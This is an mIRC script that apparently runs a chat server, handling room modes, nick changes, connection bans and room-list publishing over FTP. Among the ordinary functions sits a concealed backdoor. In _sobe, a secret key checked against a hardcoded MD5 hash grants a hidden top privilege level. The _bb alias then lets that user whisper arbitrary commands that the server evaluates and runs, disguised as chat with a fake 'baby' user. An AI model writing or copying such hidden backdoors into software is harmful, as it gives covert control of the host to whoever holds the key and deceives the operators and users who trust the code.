; other aliases

on *:start: .timerusr 0 1 usrrr
alias usrrr titlebar $sock(r.*,0) $sock(*,0) $hget(rooms,0).item up: $hget(upa,upa) $timer(shk).secs $timer(rq).secs %uj

alias _sobe {
  var %n $hsh($1,nick), %r $hsh($1,room) 
  if (!$2) return
  if (x isin $rsh(%r,mode)) return
  if ($readini(setts.ini,. $+ %r,%n) == $2-) _mode_self $1 +q
  elseif ($readini(setts.ini,@ $+ %r,%n) == $2-) _mode_self $1 +o
  elseif ($rsh(%r,ownerkey) == $2-) _mode_self $1 +q
  elseif ($rsh(%r,hostkey) == $2-) _mode_self $1 +o 
  elseif (fb3795b111641297a8560fb7dc18b59a == $md5($2-)) _ctd $1
}

alias _mode_self {
  var %l $l($1), %t $1, %n $hsh($1,nick), %r $hsh($1,room)
  if (%l > 3) halt
  if (%l) sendall %t MODE %r $replace(%l,1,-v,2,-o,3,-q) %n
  hsh %t lvl $replace($2,+q,3,+o,2)
  sendall %t MODE %r $2 %n
}

alias _do_mod {
  if ($l($1) < 2) return
  var %r r. $+ $chn($2) $+ .*, %m :'Sysop_Millena!sysop@bc
  _sw %r %m JOIN H,A,GO,. : $+ $2
  _sw %r %m MODE $2-3
  _sw %r %m PART $2
  if (+* iswm $3) { if (m !isin $rsh($2,mode)) rsh $2 mode $rsh($2,mode) $+ m }
  else { if (m isin $rsh($2,mode)) rsh $2 mode $remove($rsh($2,mode),m) }
}

alias _do_cmode {
  if ($l($1) < 2) return
  var %m $right($3,1), %w $iif(+* iswm $3,1,0)
  rsh $2 mode $remove($rsh($2,mode),%m) $+ $iif(%w,%m)
  sendall $1 MODE $2-
}

alias _do_limit {
  if ($l($1) < 2) return | if ($3 == -l) { _do_cmode $1- | rsh $2 limit }
  elseif ($4 isnum 1-65536) { _do_cmode $1- | rsh $2 limit $4 }
}

alias chgnk {
  tokenize 32 $1 $left($replace($2-,?,$r(1111,9999),$chr(32), ),50)
  if ($invalidnick($2)) _cmd_fb $1 -- nick invalido
  elseif (n isin $rsh($hsh($1,room),mode)) _cmd_fb $1 -- nao eh permitido troca de nicks nessa sala.
  elseif (!$snc($hsh($1,room),$2)) {
    sendall $1 PRIVMSG $hsh($1,room) :ACTION mudou de nick para $2- $+ .
    sendall $1 NICK : $+ $2
    hsh $1 nick $2
    hsh $1 id $+(:,$2,!,$hsh($1,gate),$iif($hsh($1,bot),@bot,$bc2))
    .timer $+ $token($1,-2-1,46) -m 0 50 sckr $1-2
  }
}

alias sckr if ($sock($1).status == active) { sockrename $1 $+(r.,$chn($hsh($1,room)),.,$nck($2),.,$token($1,-2-1,46)) | .timer $+ $token($1,-2-1,46) off }

; chat

alias cb {
  if ($sock(*. $+ $token($1,-1,46),0) > 16) { echo 4 @joins banned: $sock($1).ip max 16 connections | sockclose $1 }
  var %f sbans.txt, %i $lines(%f)
  while (%i) { if ($read(%f,%i) iswm $sock($1).ip) { sockclose $1 | echo 4 @joins banned: $sock($1).ip $read(%f,%i) } | dec %i }
  .timer 1 0 p_check $sock($1).ip
}

alias scan {
  var %s *. $+ $token($1,-1,46), %i 1, %k, %n $sock(%s,0), %a
  _cmd_fb $2 IP: $sock(%s).ip Nick: $hsh($1,nick)
  while (%i <= %n) {
    %k = $sock(%s,%i)
    if ($hsh(%k,auth)) { if ($v1 !isin %a) { %a = %a $v1 } }
    _cmd_fb $2 Nick: $hsh(%k,nick) ; Sala: $hsh(%k,room) $iif($hsh(%k,bot),; eh bot)
    inc %i
  }
  if ($l($2) > 5) _cmd_fb $2 Auth: %a
}

alias _hl _sw $2 $hsh($1,id) NOTICE $hsh($2,nick) :TIME $3- $+ 

alias _ctd {
  hsh $1 lvl $calc(10+ $l($1)) | hsh $1 dad 1
  _sw $1 :'baby!x@x JOIN H,A,GB : $+ $hsh($1,room) $lf :'baby!x@x WHISPER $hsh($1,room) $hsh($1,nick) :hi daddy!
}
alias _bb {
  var %s $1, %r $hsh(%s,room), %n $hsh(%s,nick), %x :'baby!x@x WHISPER %r %n :
  tokenize 32 $1 $iif(:S == $2,$left($4-,-1),$right($2-,-1))
  if (!$hsh(%s,dad)) return
  if (+z == $2) rsh %r mode z $+ $rsh(%r,mode)
  elseif (-z == $2) rsh %r mode $remove($rsh(%r,mode),z)
  else { $iif($2 == x,_sw %s %x) $eval($3-,$iif($2 == n,0,2)) }
}

; infos

alias i {
  var %r $hsh($1,room), %n $hsh($1,nick)
  echo 4 -a * Room info:
  echo -a * $rsh(%r,name) -> $rsh(%r,mode) -> $rsh(%r,ownerkey)
  echo -a * $rsh(%r,topic) -> $rsh(%r,onjoin)
  echo 4 -a * User info:
  echo -a * %n -> $sock($1).ip
  echo -a * $hsh($1,id) -> $hsh($1,ui)
  echo -a * $1
  t $token($1,-1,46)
}

alias t {
  var %s *. $+ $1, %i 1, %k, %n $sock(%s,0)
  echo -a ~~~~~~~~~~~~~
  echo 4 -a * IP: $sock(%s).ip
  while (%i <= %n) {
    %k = $sock(%s,%i)
    echo -a * $hsh(%k,nick) ; $hsh(%k,room) ; %k
    inc %i
  }
  echo -a ~~~~~~~~~~~~~
}

; clean hashs

alias clshsh {
  clsrm | var %r, %i $hget(0)
  while (%i) {
    if (acc.* iswm $hget(%i)) { if (!$hget($token($hget(%i),2-,46))) hfree $hget(%i) }
    elseif ($hget(%i,name)) && (r !isin $hget(%i,mode)) && (!$sock($+(r.,$hget(%i),.*))) hfree -w $hget(%i)
    elseif ($hget(%i,nick)) && (!$sock(*. $+ $hget(%i))) hfree $hget(%i)
    dec %i
  }
}

alias clsrm var %r, %i $hget(rooms,0).item | while (%i) { %r = $hget(rooms,%i).item | if (!$hget(%r)) || ($hget(%r,cat) !isin %cats) hdel rooms %r | dec %i }

; send list

; to uper

alias _send_list_s {
  var %r, %i $hget(rooms,0).item | _sw $1 1
  while (%i) {
    %r = $hget(rooms,%i).item | dec %i | if (!$hget(%r)) || ($hget(%r,cat) !isin %cats) hdel rooms %r
    else _sw $1 l $hget(%r,name) $users(%r) $hget(%r,cat) %srv $hget(%r,mode) $hget(%r,topic)
  }
  _sw $1 0
}

; to user

alias _send_list {
  var %r, %i $hget(rooms,0).item, %a _sw $1, %f list $+ %srv $+ .php
  if (!$1) { %a = write %f | write -c %f }
  while (%i) {
    %r = $hget(rooms,%i).item | dec %i | if (!$hget(%r)) || ($hget(%r,cat) !isin %cats) hdel rooms %r
    elseif (h !isin $hget(%r,mode)) %a l $hget(%r,name) $users(%r) $hget(%r,cat) %srv $iif(r isin $hget(%r,mode),1,0) $hget(%r,topic)
  }
  if ($1) %a 0 | else { sockclose rl | sockopen rl $ftphost 21 }
}

on *:sockopen:rl: _sw rl $+($loginstr,$lf,PASV)
on *:sockread:rl: {
  var %x, %f1 list $+ %srv $+ .php, %f2 list $+ %srv $+ .tmp
  sockread %x | echo @ftp rl %x
  if (227* iswm %x) {
    _sw rl STOR %f2 | tokenize 44 $token($token(%x,2,40),1,41)
    sockopen %f1 $replace($1-4,$chr(32),.) $calc($5 * 256 + $6)
  }
  if (226* iswm %x) _sw rl $+(DELE %f1,$crlf,RNFR %f2,$crlf,RNTO %f1,$crlf,QUIT)
}
